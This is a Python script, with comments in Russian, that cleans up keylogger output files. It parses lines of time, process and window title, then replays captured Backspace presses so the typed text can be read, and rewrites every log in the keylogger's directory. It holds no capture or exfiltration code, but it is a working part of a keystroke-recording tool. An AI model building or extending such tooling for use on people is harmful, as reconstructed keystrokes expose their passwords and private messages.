import os
import re
from keylogger import get_log_dir



def process_line(line: str) -> str:
    # Отделяем префикс (время + процесс + окно) от содержимого нажатий клавиш
    # Шаблон ищет: время - [процесс] - "окно" - содержимое
    match = re.match(r"^(.*? - \[.*?\] - \".*?\" - )(.*)$", line)
    if not match:
        return line.strip()  # Если строка не соответствует формату, возвращаем как есть

    # Разделяем строку на префикс (метаданные) и содержимое (нажатия клавиш)
    prefix, content = match.groups()
    result = []  # Список для накопления обработанных символов

    i = 0
    # Проходим по всем символам содержимого
    while i < len(content):
        # Обработка клавиши Backspace
        if content.startswith("[Backspace]", i):
            if result:  # Если есть символы для удаления
                result.pop()  # Удаляем последний символ (эмулируем Backspace)
            i += len("[Backspace]")  # Пропускаем обработанный [Backspace]

        # Обработка специальных клавиш (в квадратных скобках)
        elif content[i] == "[":
            # Ищем закрывающую скобку для специальной клавиши
            end = content.find("]", i)
            if end != -1:
                # Добавляем всю специальную клавишу как единый элемент
                result.append(content[i:end + 1])
                i = end + 1  # Переходим к позиции после закрывающей скобки
            else:
                # Если закрывающей скобки нет, добавляем только открывающую
                result.append(content[i])
                i += 1

        # Обработка обычных символов
        else:
            result.append(content[i])  # Добавляем обычный символ
            i += 1

    # Собираем результат: префикс + обработанное содержимое
    return prefix + "".join(result).strip()


def process_file(path):
    """
    Обрабатывает весь файл лога, применяя обработку к каждой строке.

    Args:
        path (str): Путь к файлу лога для обработки
    """
    # Чтение всех строк из файла
    with open(path, "r", encoding="utf-8") as f:
        lines = f.readlines()

    # Обработка каждой строки файла
    processed = [process_line(line) for line in lines]

    # Перезапись файла с обработанными данными
    with open(path, "w", encoding="utf-8") as f:
        for line in processed:
            f.write(line + "\n")  # Записываем обработанные строки


def process_all_logs():
    """
    Обрабатывает все текстовые файлы логов в директории logs.
    Выводит прогресс обработки для каждого файла.
    """
    # Получаем правильный путь к папке logs
    log_dir = get_log_dir()

    # Проверяем существует ли папка
    if not os.path.exists(log_dir):
        print(f"Log directory does not exist: {log_dir}")
        return

    # Обрабатываем файлы
    processed_count = 0
    for filename in os.listdir(log_dir):
        if filename.endswith(".txt"):
            path = os.path.join(log_dir, filename)
            print(f"Processing file: {filename}")
            process_file(path)
            processed_count += 1

    if processed_count == 0:
        print("No log files found to process")
    else:
        print(f"Processed {processed_count} log files")


if __name__ == "__main__":
    process_all_logs()